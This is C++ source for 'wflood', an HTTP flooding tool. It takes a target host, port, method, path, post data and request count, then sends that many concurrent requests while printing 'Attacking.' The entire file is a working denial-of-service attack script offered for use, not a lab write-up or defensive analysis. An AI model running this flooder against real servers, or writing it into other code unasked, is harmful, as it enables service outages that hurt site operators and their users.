// compile with  g++ wflood.cpp httpcpp.cpp -o wflood -std=c++11 
// by sha0coder using the great lib httpcpp form https://github.com/amcewen/HttpClient


#include "httpcpp.h"
#include <iostream>
#include <unistd.h>


using namespace std;

static float counter = 0;

class HttpResponseHndl : public HttpResponseHandler {
    public:
        void handle(HttpResponse* const response) {
            cout << counter-- << " [" << response->get_code() << "] ";
            cout << response->get_body().size() << " bytes" << endl;
            if (counter <= 0)
                exit(1);
        }
};


void usage() {
    cout << "USAGE: " << endl;
    cout << "  -h [host] " << endl;
    cout << "  -p [port] " << endl;
    cout << "  -m [method] " << endl;
    cout << "  -r [resource] " << endl;
    cout << "  -d [post data] " << endl;
    cout << "  -c [num of packets to send] " << endl;
    cout << "  -t [timeout] " << endl;
    cout << "  (use -c or -t but not both) " << endl;
    cout << "Ex:" << endl;
    cout << " ./wflood  -h 127.0.0.1 -p 80 -m GET -r / -c 10 " << endl;
    exit(1);
}

int main(int argc, char **argv) {

    /*
    if (argc != 7) {
        cout << argv[0] << " [ip] [port] [method] [path] [post] [requests] [timeout] " << endl;
        cout << "  if the " << endl;
        exit(1);
    }*/

    char *host = NULL;
    char *meth = NULL;
    char *data = "A";
    char *resource = NULL;
    int op,  port=0, timeout=0;
    while ((op = getopt(argc, argv, "h:p:m:r:c:d:t:")) != EOF) {
        switch(op) {
            case 'h': host = optarg; break;
            case 'p': port = atoi(optarg); break;
            case 'm': meth = optarg; break;
            case 'r': resource = optarg; break;
            case 'd': data = optarg; break;
            case 'c': counter = atoi(optarg); break;
            case 't': timeout = atoi(optarg); break;
            case '?': usage(); break;
            default:  usage(); break;
        }
    }


    if (host == NULL || meth == NULL || port == 0 || resource == NULL)
        usage();

    if (counter == 0 && timeout == 0)
        usage();


    cout << "preparing attack ..." << endl;
    AsyncHttpClient *client = new AsyncHttpClient();
    //cout << " h:" << host << " p:" << port << " m:" << meth << " r:" << resource << " d:" << data << " c:" << counter << endl;

    try {
        if (counter > 0) {
            for (float i = 0; i < counter; i++)
                client->fetch(host, port, meth, resource, data, new HttpResponseHndl);
        } else {
            cout << "unimplemented" << endl;
        }

    } catch(runtime_error e) {
        cout << "Connection refused." << endl;
    }

    cout << "Attacking." << endl;
    IOLoop::instance()->start();
    delete client;
}
